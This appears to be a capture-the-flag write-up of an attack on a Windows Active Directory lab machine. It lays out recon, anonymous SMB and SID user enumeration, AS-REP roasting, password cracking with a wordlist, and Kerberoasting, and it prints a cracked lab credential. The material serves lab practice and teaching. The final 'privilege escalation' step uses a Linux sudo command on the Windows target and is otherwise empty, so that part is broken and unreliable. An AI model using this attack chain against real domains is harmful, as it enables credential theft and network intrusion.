---
layout: post
author: Fr4nSec
tags: [Windows, SMB,]
---

CTF challenge having a Windows target. SMB is key to solve it.

## Objectives

- Obtain the user flag
- Obtain the system flag (root)

## Recon

Let's scan the target IP address..

```
nmap -p- -sS --min-rate 5000 -n -Pn 10.10.216.196
```
![scan1](/images/scan1.jpg)

Once we have a list of open ports, let's scan those ports more in depth.

```
nmap -p 53,135,139,389,445,464,636,3268,5985,9389 -sCV 10.10.216.196 > PortScan
cat PortScan
```

![scan2](/images/scan2.jpg)

We can see some information like domain name and the host.

- Domain: vulnnet-rst.local0
- Host: WIN-2BO8M1OE1M1

Port 445 (SMB) is open. Let's see what we can retrieve from there.

```
smbmap -H 10.10.216.196 -u anonymous
```

![smb1](/images/smb1.jpg)




## Exploitation

IPC$ seems to be readable. That means we might be able to ennumerate names of domain accounts. Let's try:

```
impacket-lookupsid anonymous@10.10.216.196
```

![smb2](/images/smb2.jpg)

We can see some user names, let's strip out the data we don't need. Copy the result to a file and run the below to keep only the user names.

```
cat fullinfo.txt | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F'(' '{print $1}'
```

![users1](/images/users.jpg)

Now, having a list of users, let's try to harvest AS_REP responses to see if we can get a hash. (The IP changed because i had to restart the target machine).

```
impacket-GetNPUsers 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.171.250
```
![hash1](/images/hash1.jpg)

We obtained the hash for the user t-skid. We can try brute force it:

```
john hash1 --wordlist=/home/kali/rockyou.txt 
```

![crackedhash](/images/crackedhash.jpg)

Now let's try to find some SPN associated with user accounts. Result should be a file with encrypted password.

```
impacket-GetUserSPNs 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.171.250 
```

![GetUserSPNs](/images/SPN.jpg)

![hash2](/images/hash2.jpg)

Now we can try crack it the same way as before:

![cracked2](/images/cracked2.jpg)



## Privilege escalation

Let's check if sudo has any additional configuration..

```
sudo cat /root/root.txt
```
